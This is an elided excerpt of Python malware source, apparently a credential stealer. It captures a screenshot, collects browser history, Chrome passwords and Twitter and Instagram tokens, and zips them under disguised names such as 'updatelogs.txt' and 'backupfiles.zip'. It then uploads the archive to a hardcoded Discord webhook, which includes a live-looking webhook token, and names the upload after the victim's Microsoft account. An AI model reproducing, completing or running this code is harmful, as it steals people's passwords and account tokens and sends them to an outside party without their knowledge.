...
def get_screenshot(path):
    ...
    get_screenshot.scrn_path = os.path.join(
        path, f"MicrosoftScreen_{''.join(choices(list(ascii_letters + digits), k=5))}.png"
    )
...
def send_webhook(DISCORD_WEBHOOK_URLs):
    ...
    with TemporaryDirectory(dir=".") as td:
        ...
        files_names = [
            ...
            [os.path.join(td, "twitter.txt"), twitter_T],
            [os.path.join(td, "instagram.txt"), insta_T],
            [os.path.join(td, "updatelogs.txt"), chrome_Psw_t],
        ]
        ...
        with open(all_files[0], "w") as f:
            f.write(find_His())
        with ZipFile(
            os.path.join(td, "backupfiles.zip"), mode="w", compression=ZIP_DEFLATED
        ) as zip:
        ...
        for URL in DISCORD_WEBHOOK_URLs:
            webhook = DiscordWebhook(
                url=URL,
                username="Elite Camerawoman",
                avatar_url="https://i.pinimg.com/474x/2a/93/99/2a93996022cff26717f40a756a0711ca.jpg",
            )
            ...
            embed.set_timestamp()
            with open(os.path.join(td, "backupfiles.zip"), "rb") as f:
                webhook.add_file(
                    file=f.read(),
                    filename=f"Microsoft-Account-{os.getenv('UserName')}.zip",
                )
...
if __name__ == "__main__":
    freeze_support()
    if len(sys.argv) == 1:
        send_webhook(["https://discord.com/api/webhooks/1277888614935560192/dTccxDHYCb-M4g5sO8ljXll1okl8kOkydrnz8pRTwq-h7LmnfaBEzT9wj6O3XzppG2UZ
		      "])
